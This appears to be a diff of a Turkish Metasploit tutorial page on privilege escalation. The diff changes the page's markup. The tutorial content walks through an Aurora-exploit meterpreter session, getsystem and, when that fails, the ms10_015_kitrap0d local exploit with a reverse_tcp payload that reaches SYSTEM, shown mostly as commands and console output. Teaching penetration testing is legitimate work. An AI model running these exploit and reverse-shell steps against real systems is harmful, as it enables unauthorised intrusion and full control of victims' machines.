@@ -32,7 +32,7 @@ url: /tr/msf-yetki-yukseltme/
 ---
 
  
-<h2 class="wp-block-heading" id="ya-sonra">Ya sonra?</h2>
+<h2 class="wp-block-heading" id="ya-sonra">Ya sonra?
 <!-- /wp:heading -->
 
   Bir sistemin zafiyetini bulmak için gerekli çalışmaları yaptınız. Açık noktasını buldunuz ve doğru adımları uyguladıktan sonra hedef bilgisayarda bir komut satırı açmayı başardınız. Peki bundan sonra ne yapılmalı? 
@@ -45,38 +45,38 @@ url: /tr/msf-yetki-yukseltme/
  
 
  
-<h2 class="wp-block-heading" id="yetkisiz-oturum">Yetkisiz Oturum</h2>
+<h2 class="wp-block-heading" id="yetkisiz-oturum">Yetkisiz Oturum
 <!-- /wp:heading -->
 
   Aşağıdaki örnekte görüldüğü gibi, hedef sistemde&nbsp;<code>ms10_002_aurora</code>&nbsp;modülü kullanılarak yetkisiz bir meterpreter oturumu açılmıştır. 
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit<strong>(</strong>ms10_002_aurora<strong>)</strong> <strong>&gt;</strong>
-<strong>[</strong><strong>*</strong><strong>]</strong> Sending Internet Explorer "Aurora" Memory Corruption to client 192.168.1.161
-<strong>[</strong><strong>*</strong><strong>]</strong> Sending stage <strong>(</strong>748544 bytes<strong>)</strong> to 192.168.1.161
-<strong>[</strong><strong>*</strong><strong>]</strong> Meterpreter session 3 opened <strong>(</strong>192.168.1.71:38699 -&gt; 192.168.1.161:4444<strong>)</strong> at 2010-08-21 13:39:10 -0600
+<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit***(*** ms10_002_aurora***)***  ***&gt;*** 
+***[*** ******* ***]***  Sending Internet Explorer "Aurora" Memory Corruption to client 192.168.1.161
+***[*** ******* ***]***  Sending stage ***(*** 748544 bytes***)***  to 192.168.1.161
+***[*** ******* ***]***  Meterpreter session 3 opened ***(*** 192.168.1.71:38699 -&gt; 192.168.1.161:4444***)***  at 2010-08-21 13:39:10 -0600
 
-msf exploit<strong>(</strong>ms10_002_aurora<strong>)</strong> <strong>&gt;</strong> sessions -i 3
-<strong>[</strong><strong>*</strong><strong>]</strong> Starting interaction with 3...
+msf exploit***(*** ms10_002_aurora***)***  ***&gt;***  sessions -i 3
+***[*** ******* ***]***  Starting interaction with 3...
 
-meterpreter <strong>&gt;</strong> getuid
+meterpreter ***&gt;***  getuid
 Server username: XEN-XP-SP2-BARE\victim
-meterpreter <strong>&gt;</strong>
+meterpreter ***&gt;*** 
 </code></pre>
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="getsystem">GetSystem</h2>
+<h2 class="wp-block-heading" id="getsystem">GetSystem
 <!-- /wp:heading -->
 
   <code>getsystem</code>&nbsp;komutunu kullanabilmek için öncelikle&nbsp;<code>priv</code>&nbsp;eklentisini sisteme yükleyelim. 
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> use priv
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  use priv
 Loading extension priv...success.
-meterpreter <strong>&gt;</strong>
+meterpreter ***&gt;*** 
 </code></pre>
 <!-- /wp:code -->
 
@@ -119,16 +119,16 @@ meterpreter &gt;
 <!-- /wp:code -->
 
  
-<h2 class="wp-block-heading" id="yerel-exploit-kullanma">Yerel Exploit Kullanma</h2>
+<h2 class="wp-block-heading" id="yerel-exploit-kullanma">Yerel Exploit Kullanma
 <!-- /wp:heading -->
 
   Bazı durumlarda&nbsp;<code>getsystem</code>&nbsp;başarısız olur. Aşağıda bunun örneğini görebilirsiniz.&nbsp;<code>getsystem</code>&nbsp;başarısız olduğunda oturumu arka plana gönderip, Metasploit Framework içerisindeki diğer exploit modüllerini kullanmak gerekmektedir. 
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> getsystem
-<strong>[</strong>-] priv_elevate_getsystem: Operation failed: Access is denied.
-meterpreter <strong>&gt;</strong>
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  getsystem
+***[*** -] priv_elevate_getsystem: Operation failed: Access is denied.
+meterpreter ***&gt;*** 
 </code></pre>
 <!-- /wp:code -->
 
@@ -136,9 +136,9 @@ meterpreter <strong>&gt;</strong>
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> background
-<strong>[</strong><strong>*</strong><strong>]</strong> Backgrounding session 1...
-msf exploit<strong>(</strong>ms10_002_aurora<strong>)</strong> <strong>&gt;</strong> use exploit/windows/local/
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  background
+***[*** ******* ***]***  Backgrounding session 1...
+msf exploit***(*** ms10_002_aurora***)***  ***&gt;***  use exploit/windows/local/
 ...snip...
 use exploit/windows/local/bypassuac
 use exploit/windows/local/bypassuac_injection
@@ -149,7 +149,7 @@ use exploit/windows/local/ms11_080_afdjoinleaf
 use exploit/windows/local/ms13_005_hwnd_broadcast
 use exploit/windows/local/ms13_081_track_popup_menu
 ...snip...
-msf exploit<strong>(</strong>ms10_002_aurora<strong>)</strong> <strong>&gt;</strong>
+msf exploit***(*** ms10_002_aurora***)***  ***&gt;*** 
 </code></pre>
 <!-- /wp:code -->
 
@@ -157,25 +157,25 @@ msf exploit<strong>(</strong>ms10_002_aurora<strong>)</strong> <strong>&gt;</str
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit<strong>(</strong>ms10_002_aurora<strong>)</strong> <strong>&gt;</strong> use exploit/windows/local/ms10_015_kitrap0d
-msf exploit<strong>(</strong>ms10_015_kitrap0d<strong>)</strong> <strong>&gt;</strong> set SESSION 1
-msf exploit<strong>(</strong>ms10_015_kitrap0d<strong>)</strong> <strong>&gt;</strong> set PAYLOAD windows/meterpreter/reverse_tcp
-msf exploit<strong>(</strong>ms10_015_kitrap0d<strong>)</strong> <strong>&gt;</strong> set LHOST 192.168.1.161
-msf exploit<strong>(</strong>ms10_015_kitrap0d<strong>)</strong> <strong>&gt;</strong> set LPORT 4443
-msf exploit<strong>(</strong>ms10_015_kitrap0d<strong>)</strong> <strong>&gt;</strong> show options
+<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit***(*** ms10_002_aurora***)***  ***&gt;***  use exploit/windows/local/ms10_015_kitrap0d
+msf exploit***(*** ms10_015_kitrap0d***)***  ***&gt;***  set SESSION 1
+msf exploit***(*** ms10_015_kitrap0d***)***  ***&gt;***  set PAYLOAD windows/meterpreter/reverse_tcp
+msf exploit***(*** ms10_015_kitrap0d***)***  ***&gt;***  set LHOST 192.168.1.161
+msf exploit***(*** ms10_015_kitrap0d***)***  ***&gt;***  set LPORT 4443
+msf exploit***(*** ms10_015_kitrap0d***)***  ***&gt;***  show options
 
-Module options <strong>(</strong>exploit/windows/local/ms10_015_kitrap0d<strong>)</strong>:
+Module options ***(*** exploit/windows/local/ms10_015_kitrap0d***)*** :
 
    Name     Current Setting  Required  Description
    ----     ---------------  --------  -----------
    SESSION  1                yes       The session to run this module on.
 
 
-Payload options <strong>(</strong>windows/meterpreter/reverse_tcp<strong>)</strong>:
+Payload options ***(*** windows/meterpreter/reverse_tcp***)*** :
 
    Name      Current Setting  Required  Description
    ----      ---------------  --------  -----------
-   EXITFUNC  process          yes       Exit technique <strong>(</strong>accepted: seh, thread, process, none<strong>)</strong>
+   EXITFUNC  process          yes       Exit technique ***(*** accepted: seh, thread, process, none***)*** 
    LHOST     192.168.1.161    yes       The listen address
    LPORT     4443             yes       The listen port
 
@@ -184,21 +184,21 @@ Exploit target:
 
    Id  Name
    --  ----
-   0   Windows 2K SP4 - Windows 7 <strong>(</strong>x86<strong>)</strong>
+   0   Windows 2K SP4 - Windows 7 ***(*** x86***)*** 
 
 
-msf exploit<strong>(</strong>ms10_015_kitrap0d<strong>)</strong> <strong>&gt;</strong> exploit
+msf exploit***(*** ms10_015_kitrap0d***)***  ***&gt;***  exploit
 
-<strong>[</strong><strong>*</strong><strong>]</strong>  Started reverse handler on 192.168.1.161:4443 
-<strong>[</strong><strong>*</strong><strong>]</strong>  Launching notepad to host the exploit...
-<strong>[</strong>+]  Process 4048 launched.
-<strong>[</strong><strong>*</strong><strong>]</strong>  Reflectively injecting the exploit DLL into 4048...
-<strong>[</strong><strong>*</strong><strong>]</strong>  Injecting exploit into 4048 ...
-<strong>[</strong><strong>*</strong><strong>]</strong>  Exploit injected. Injecting payload into 4048...
-<strong>[</strong><strong>*</strong><strong>]</strong>  Payload injected. Executing exploit...
-<strong>[</strong>+]  Exploit finished, wait <strong>for</strong> <strong>(</strong>hopefully privileged<strong>)</strong> payload execution to complete.
-<strong>[</strong><strong>*</strong><strong>]</strong>  Sending stage <strong>(</strong>769024 bytes<strong>)</strong> to 192.168.1.71
-<strong>[</strong><strong>*</strong><strong>]</strong>  Meterpreter session 2 opened <strong>(</strong>192.168.1.161:4443 -&gt; 192.168.1.71:49204<strong>)</strong> at 2014-03-11 11:14:00 -0400
+***[*** ******* ***]***   Started reverse handler on 192.168.1.161:4443 
+***[*** ******* ***]***   Launching notepad to host the exploit...
+***[*** +]  Process 4048 launched.
+***[*** ******* ***]***   Reflectively injecting the exploit DLL into 4048...
+***[*** ******* ***]***   Injecting exploit into 4048 ...
+***[*** ******* ***]***   Exploit injected. Injecting payload into 4048...
+***[*** ******* ***]***   Payload injected. Executing exploit...
+***[*** +]  Exploit finished, wait ***for***  ***(*** hopefully privileged***)***  payload execution to complete.
+***[*** ******* ***]***   Sending stage ***(*** 769024 bytes***)***  to 192.168.1.71
+***[*** ******* ***]***   Meterpreter session 2 opened ***(*** 192.168.1.161:4443 -&gt; 192.168.1.71:49204***)***  at 2014-03-11 11:14:00 -0400
 </code></pre>
 <!-- /wp:code -->
 
@@ -206,7 +206,7 @@ msf exploit<strong>(</strong>ms10_015_kitrap0d<strong>)</strong> <strong>&gt;</s
  
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter <strong>&gt;</strong> getuid
+<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  getuid
 Server username: NT AUTHORITY\SYSTEM
-meterpreter <strong>&gt;</strong></code></pre>
+meterpreter ***&gt;*** </code></pre>
 <!-- /wp:code -->
